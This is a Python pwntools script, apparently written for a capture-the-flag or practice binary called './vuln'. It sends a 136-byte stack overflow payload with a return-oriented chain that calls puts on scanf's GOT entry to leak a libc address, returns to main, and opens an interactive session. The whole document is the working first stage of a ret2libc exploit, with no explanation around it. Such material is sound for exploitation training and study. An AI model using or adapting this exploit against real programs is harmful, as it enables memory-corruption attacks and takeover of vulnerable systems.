from pwn import *
import struct

p = process("./vuln")

offset = 136

junk = b"A"*136
"""
0x0000000000400913 : pop rdi ; ret
"""
pop_rdi = 0x400913
scanf_got = 0x601038
puts_at_plt = 0x400540
back_at_main_address = 0x400771

payload = [
        junk,
        # Call puts to leak memory address of `scanf` function
        p64(pop_rdi),
        p64(scanf_got),
        p64(puts_at_plt),
        # puts need an argument, so we give it an address to jump to
        p64(back_at_main_address)
]
payload = b"".join(payload)
p.sendline(payload)

# banner: Welcome to my server \n
p.recvline()
# Echo output
p.recvline()
# leaked address
leaked_address = p.recvline().strip()
log.info(f"[+] Leaked: {leaked_address}")
p.interactive()
